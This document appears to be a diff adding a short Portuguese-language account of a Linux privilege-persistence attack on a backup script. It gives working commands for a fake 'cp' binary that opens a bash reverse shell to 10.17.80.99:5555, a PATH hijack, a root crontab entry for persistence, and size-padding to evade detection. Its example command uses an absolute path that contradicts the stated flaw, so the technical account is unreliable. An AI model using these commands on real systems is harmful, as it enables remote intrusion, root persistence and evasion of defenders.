@@ -1,0 +1,18 @@
+O atacante explorou um software interno que executava scripts de backup via comandos do tipo:
+
+/usr/bin/cp -r /home/data /mnt/backup
+
+Descobriu-se que o script não usava caminho absoluto para o cp. O atacante criou um binário malicioso chamado cp com:
+
+echo -e '#!/bin/bash\n/bin/bash -i >& /dev/tcp/10.17.80.99/5555 0>&1' > /tmp/cp
+chmod +x /tmp/cp
+
+E alterou a variável de ambiente PATH:
+
+export PATH=/tmp:$PATH
+
+Ao executar o script de backup, a shell reversa foi ativada. Para dificultar detecção, o binário falso tinha mesmo tamanho do original (ls -l) e foi camuflado com padding binário.
+
+Além disso, foi usado o cron para agendamento de persistência:
+
+echo "* * * * * /tmp/cp" >> /var/spool/cron/crontabs/root
